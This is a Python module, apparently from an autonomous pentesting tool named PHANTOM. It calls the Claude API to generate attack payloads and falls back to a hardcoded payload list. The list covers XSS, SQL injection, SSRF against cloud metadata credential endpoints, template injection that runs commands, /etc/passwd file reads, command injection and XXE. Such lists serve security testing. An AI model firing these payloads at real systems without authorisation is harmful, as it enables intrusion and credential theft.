"""
LLM Engine — Claude API interface.

Priority order:
1. Claude API (Anthropic) — best quality, requires API key or OAuth token
2. Fallback — hardcoded rules when no LLM available

Set ANTHROPIC_API_KEY in .env or store OAuth token in Redis to enable Claude.
"""
import json
import logging
import re

import httpx
from app.config import get_settings

settings = get_settings()
logger = logging.getLogger(__name__)

SYSTEM_PROMPT = """You are PHANTOM, an expert autonomous penetration testing AI.
You analyze web applications for security vulnerabilities.
You are precise, methodical, and always respond in structured JSON when requested.
You have deep knowledge of OWASP Top 10, CVEs, exploit techniques, WAF bypass methods, and payload crafting.
Always think step by step and provide actionable recommendations.
IMPORTANT: When asked for JSON, respond ONLY with valid JSON. No markdown, no explanation, no code fences."""


class LLMEngine:
    def __init__(self):
        from app.ai.get_claude_key import get_claude_api_key
        self.claude_api_key = get_claude_api_key() or settings.anthropic_api_key
        self.claude_model = settings.claude_model
        self.client = httpx.AsyncClient(timeout=180.0)
        self._provider = None  # "claude" or None
        self._is_oauth = self._detect_oauth()

    def _detect_oauth(self) -> bool:
        """Check if the current key is an OAuth token."""
        if self.claude_api_key and self.claude_api_key.startswith("sk-ant-oat"):
            return True
        return False

    def _claude_headers(self) -> dict:
        """Build headers for Claude API — OAuth Bearer or standard x-api-key."""
        if self._is_oauth:
            return {
                "Authorization": f"Bearer {self.claude_api_key}",
                "anthropic-version": "2023-06-01",
                "anthropic-beta": "oauth-2025-04-20",
                "content-type": "application/json",
            }
        return {
            "x-api-key": self.claude_api_key,
            "anthropic-version": "2023-06-01",
            "content-type": "application/json",
        }

    def _refresh_key(self):
        """Re-read API key from Redis/env (used on 401 retry)."""
        from app.ai.get_claude_key import get_claude_api_key
        new_key = get_claude_api_key() or settings.anthropic_api_key
        if new_key and new_key != self.claude_api_key:
            logger.info("LLM key refreshed from Redis")
            self.claude_api_key = new_key
            self._is_oauth = self._detect_oauth()
            self._provider = None  # force re-detect
            return True
        return False

    @property
    def provider(self) -> str:
        """Current active provider name."""
        return self._provider or "none"

    async def _detect_provider(self) -> str | None:
        """Detect if Claude API is available."""
        if self._provider is not None:
            return self._provider

        if (self.claude_api_key
                and len(self.claude_api_key) > 10
                and not self.claude_api_key.startswith("your_")):
            try:
                resp = await self.client.post(
                    "https://api.anthropic.com/v1/messages",
                    headers=self._claude_headers(),
                    json={
                        "model": self.claude_model,
                        "max_tokens": 1,
                        "messages": [{"role": "user", "content": "hi"}],
                    },
                    timeout=10.0,
                )
                if resp.status_code in (200, 400, 429):
                    self._provider = "claude"
                    logger.info("LLM provider: Claude API (%s)",
                                "OAuth" if self._is_oauth else "API key")
                    return self._provider
                elif resp.status_code == 401:
                    logger.warning("Claude API 401 — refreshing key...")
                    if self._refresh_key():
                        resp2 = await self.client.post(
                            "https://api.anthropic.com/v1/messages",
                            headers=self._claude_headers(),
                            json={
                                "model": self.claude_model,
                                "max_tokens": 1,
                                "messages": [{"role": "user", "content": "hi"}],
                            },
                            timeout=10.0,
                        )
                        if resp2.status_code in (200, 400, 429):
                            self._provider = "claude"
                            logger.info("LLM provider: Claude API (after refresh)")
                            return self._provider
                    logger.warning("Claude API key is invalid (401)")
                else:
                    logger.warning("Claude API returned %s", resp.status_code)
            except Exception as e:
                logger.warning("Claude API detection error: %s", e)

        self._provider = None
        logger.warning("No LLM provider available (set ANTHROPIC_API_KEY)")
        return None

    async def is_available(self) -> bool:
        """Check if any LLM provider is available."""
        provider = await self._detect_provider()
        return provider is not None

    async def analyze(self, prompt: str, temperature: float = 0.3) -> str:
        """Send prompt to Claude API."""
        provider = await self._detect_provider()

        if provider == "claude":
            return await self._call_claude(prompt, temperature)
        else:
            raise LLMError("No LLM provider available (set ANTHROPIC_API_KEY)")

    async def _call_claude(self, prompt: str, temperature: float) -> str:
        """Call Claude API with auto-retry on 401."""
        try:
            response = await self.client.post(
                "https://api.anthropic.com/v1/messages",
                headers=self._claude_headers(),
                json={
                    "model": self.claude_model,
                    "max_tokens": 4096,
                    "temperature": temperature,
                    "system": SYSTEM_PROMPT,
                    "messages": [{"role": "user", "content": prompt}],
                },
            )

            # On 401, try refreshing key and retry once
            if response.status_code == 401:
                logger.warning("Claude 401 in _call_claude — refreshing key...")
                if self._refresh_key():
                    response = await self.client.post(
                        "https://api.anthropic.com/v1/messages",
                        headers=self._claude_headers(),
                        json={
                            "model": self.claude_model,
                            "max_tokens": 4096,
                            "temperature": temperature,
                            "system": SYSTEM_PROMPT,
                            "messages": [{"role": "user", "content": prompt}],
                        },
                    )

            response.raise_for_status()
            data = response.json()
            content = data.get("content", [])
            if content:
                return content[0].get("text", "")
            return ""
        except httpx.TimeoutException:
            raise LLMError("Claude API request timed out (180s)")
        except httpx.HTTPStatusError as e:
            if e.response.status_code in (429, 401, 503):
                raise LLMError(f"Claude API error: {e.response.status_code}")
            raise LLMError(f"Claude API error: {e.response.status_code} {e.response.text[:200]}")
        except Exception as e:
            raise LLMError(f"Claude API error: {str(e)}")

    async def analyze_json(self, prompt: str, temperature: float = 0.2) -> dict:
        """Send prompt and parse JSON response. Retries once on parse failure."""
        result = await self.analyze(prompt, temperature)
        parsed = self._extract_json(result)
        if parsed is not None:
            return parsed

        retry_prompt = (
            prompt + "\n\nIMPORTANT: Respond with ONLY valid JSON. "
            "No markdown code fences, no explanation text."
        )
        result = await self.analyze(retry_prompt, temperature=0.1)
        parsed = self._extract_json(result)
        if parsed is not None:
            return parsed

        raise LLMError(f"Failed to parse JSON from LLM response: {result[:200]}")

    def _extract_json(self, text: str) -> dict | list | None:
        """Extract JSON from LLM response, handling code fences and extra text."""
        text = text.strip()
        try:
            return json.loads(text)
        except json.JSONDecodeError:
            pass

        if "```" in text:
            match = re.search(r"```(?:json)?\s*\n?(.*?)```", text, re.DOTALL)
            if match:
                try:
                    return json.loads(match.group(1).strip())
                except json.JSONDecodeError:
                    pass

        for pattern in [r'\{[\s\S]*\}', r'\[[\s\S]*\]']:
            match = re.search(pattern, text)
            if match:
                try:
                    return json.loads(match.group(0))
                except json.JSONDecodeError:
                    continue

        return None

    async def generate_payloads(self, vuln_type: str, context: dict) -> list[str]:
        """Generate attack payloads for a specific vulnerability type."""
        prompt = f"""Generate 15 advanced {vuln_type} payloads for penetration testing.

Context:
- Technology: {context.get('technology', 'unknown')}
- WAF: {context.get('waf', 'none')}
- Parameter type: {context.get('param_type', 'string')}
- Injection point: {context.get('injection_point', 'parameter')}

Requirements:
- Mix of basic detection payloads and advanced exploitation payloads
- Include WAF bypass variants if WAF is present
- Include encoding variations
- Prioritize payloads most likely to succeed against the detected technology

Respond as a JSON array of strings. ONLY the JSON array, nothing else.
Example: ["payload1", "payload2"]"""

        try:
            result = await self.analyze(prompt)
            parsed = self._extract_json(result)
            if isinstance(parsed, list) and len(parsed) > 0:
                return [str(p) for p in parsed]
        except LLMError:
            pass

        return self._fallback_payloads(vuln_type)

    def _fallback_payloads(self, vuln_type: str) -> list[str]:
        """Hardcoded fallback payloads."""
        payloads = {
            "xss": [
                '<script>alert(1)</script>',
                '<img src=x onerror=alert(1)>',
                '<svg onload=alert(1)>',
                '"><script>alert(1)</script>',
                "'-alert(1)-'",
                '<img src=x onerror=alert`1`>',
                '<svg/onload=alert(1)>',
                '<dETAILS/oPEN/oNTOGGLE=alert(1)>',
                '<body onpageshow=alert(1)>',
                '<input onfocus=alert(1) autofocus>',
                '<marquee onstart=alert(1)>',
                '<video><source onerror=alert(1)>',
                '<audio src=x onerror=alert(1)>',
                'javascript:alert(1)',
                '{{constructor.constructor("alert(1)")()}}',
                '%3Cscript%3Ealert(1)%3C/script%3E',
            ],
            "sqli": [
                "' OR '1'='1",
                "' OR 1=1--",
                "' UNION SELECT NULL--",
                "admin'--",
                "1' AND SLEEP(5)--",
                "1' AND (SELECT SLEEP(5))--",
                "1';WAITFOR DELAY '0:0:5'--",
                "1' AND pg_sleep(5)--",
                "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
                "1' ORDER BY 1--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "1'/*!50000OR*/1=1--",
                "1'/**/OR/**/1=1--",
                "-1' UNION ALL SELECT NULL--",
                '{"$gt":""}',
            ],
            "ssrf": [
                "http://169.254.169.254/latest/meta-data/",
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "http://metadata.google.internal/computeMetadata/v1/",
                "http://127.0.0.1",
                "http://localhost",
                "http://[::1]",
                "http://0x7f000001",
                "http://0177.0.0.1",
                "file:///etc/passwd",
                "gopher://127.0.0.1:6379/_INFO%0d%0a",
                "http://evil.com@127.0.0.1",
                "http://10.0.0.1",
                "http://172.16.0.1",
                "http://192.168.1.1",
            ],
            "ssti": [
                "{{7*7}}",
                "${7*7}",
                "#{7*7}",
                "<%= 7*7 %>",
                "{{config}}",
                "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
                "{{''.__class__.__mro__[1].__subclasses__()}}",
                "${T(java.lang.Runtime).getRuntime().exec('id')}",
                "<%= system('id') %>",
            ],
            "lfi": [
                "../../etc/passwd",
                "../../../etc/passwd",
                "../../../../etc/passwd",
                "%2e%2e/%2e%2e/etc/passwd",
                "/etc/passwd%00",
                "....//....//etc/passwd",
                "php://filter/convert.base64-encode/resource=index.php",
                "php://input",
                "/proc/self/environ",
            ],
            "cmd_injection": [
                "; id", "| id", "$(id)", "`id`", "|| id", "&& id",
                "%0aid", "; sleep 5", "| sleep 5", "$(sleep 5)",
                "; cat /etc/passwd", "| cat /etc/passwd",
            ],
            "open_redirect": [
                "//evil.com", "https://evil.com", "/\\evil.com",
                "//evil.com/%2f..", "////evil.com",
            ],
            "idor": [
                "1", "0", "-1", "999999", "admin",
                "../1", "null", "undefined",
                "00000000-0000-0000-0000-000000000000",
                "1&admin=true", "1&role=admin",
            ],
            "xxe": [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
            ],
        }
        return payloads.get(vuln_type, payloads.get("xss", []))

    async def close(self):
        await self.client.aclose()


class LLMError(Exception):
    pass
